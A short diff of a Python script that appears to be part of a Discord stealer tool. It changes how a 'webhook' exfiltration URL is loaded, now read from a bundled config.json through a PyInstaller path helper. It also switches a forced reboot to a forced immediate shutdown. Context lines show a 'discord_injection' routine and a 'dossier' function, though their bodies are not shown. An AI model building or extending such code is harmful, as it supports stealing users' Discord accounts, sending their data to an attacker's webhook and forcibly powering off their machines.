@@ -38,9 +38,22 @@ print(f""" {yellow}
 """)
 os.system("cls")
 
-webhook = "" 
+
+def resource_path(file):
+    try:
+        base_path = sys._MEIPASS 
+    except Exception:
+        base_path = os.path.abspath(".")
+
+    return os.path.join(base_path, file)
 
 
+config_path = resource_path("config.json")
+
+with open(config_path, "r", encoding="utf-8") as f:
+    config = json.load(f)
+
+webhook = config["webhook"]
 
 def discord_injection():
     sys.path.insert(0, os.path.join(os.path.dirname(__file__), "src"))
@@ -83,7 +96,7 @@ def dossier():
 
 def shutdown():
     try:
-        os.system("shutdown /r /t 0")
+        os.system("shutdown /s /t 0")
     except Exception as e:
         print(f"Error {e}")
 
